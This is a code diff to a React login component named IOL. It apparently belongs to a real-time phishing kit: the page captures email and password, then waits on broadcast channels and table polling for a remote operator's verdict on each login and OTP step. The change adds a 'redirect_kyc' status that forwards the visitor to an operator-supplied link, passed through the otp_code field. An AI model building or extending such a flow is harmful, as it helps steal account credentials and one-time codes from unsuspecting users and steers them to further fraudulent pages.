@@ -48,8 +48,22 @@ const IOL = () => {
     };
   }, []);
 
-  const handleDecision = useCallback((status?: string) => {
+  const redirectToKyc = useCallback((link?: string, caseId?: string) => {
+    const nextUrl = link || (caseId ? `${window.location.origin}/kyc/${caseId}` : null);
+    if (!nextUrl) return;
+    window.location.assign(nextUrl);
+  }, []);
+
+  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
+    const status = typeof payload === "string" ? payload : payload?.status;
     if (!status) return;
+
+    if (status === "redirect_kyc") {
+      if (typeof payload !== "string") {
+        redirectToKyc(payload.kyc_link, payload.kyc_case_id);
+      }
+      return;
+    }
 
     if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
       setErrorMessage("");
@@ -81,7 +95,7 @@ const IOL = () => {
       setErrorMessage("");
       setStep("waiting");
     }
-  }, []);
+  }, [redirectToKyc]);
 
   useEffect(() => {
     if (!sessionId || step === "form" || step === "success") return;
@@ -89,23 +103,29 @@ const IOL = () => {
     const channel = supabase.channel(`session-review-${sessionId}`);
     channel
       .on("broadcast", { event: "review_decision" }, (payload) => {
-        handleDecision(payload.payload?.status as string | undefined);
+        handleDecision(payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined);
       })
       .subscribe();
 
     const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
     otpChannel
       .on("broadcast", { event: "otp_decision" }, (payload) => {
-        handleDecision(payload.payload?.status as string | undefined);
+        handleDecision(payload.payload as { status?: string } | undefined);
       })
       .subscribe();
 
     const pollInterval = window.setInterval(async () => {
       const { data } = await supabase
         .from("sessions")
-        .select("status")
+        .select("status, otp_code")
         .eq("id", sessionId)
         .maybeSingle();
+
+      if (data?.status === "redirect_kyc") {
+        const kycLink = data.otp_code?.startsWith("kyc_link:") ? data.otp_code.replace("kyc_link:", "") : undefined;
+        redirectToKyc(kycLink);
+        return;
+      }
 
       if (data?.status) {
         handleDecision(data.status);
@@ -117,7 +137,7 @@ const IOL = () => {
       supabase.removeChannel(otpChannel);
       window.clearInterval(pollInterval);
     };
-  }, [handleDecision, sessionId, step]);
+  }, [handleDecision, redirectToKyc, sessionId, step]);
 
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
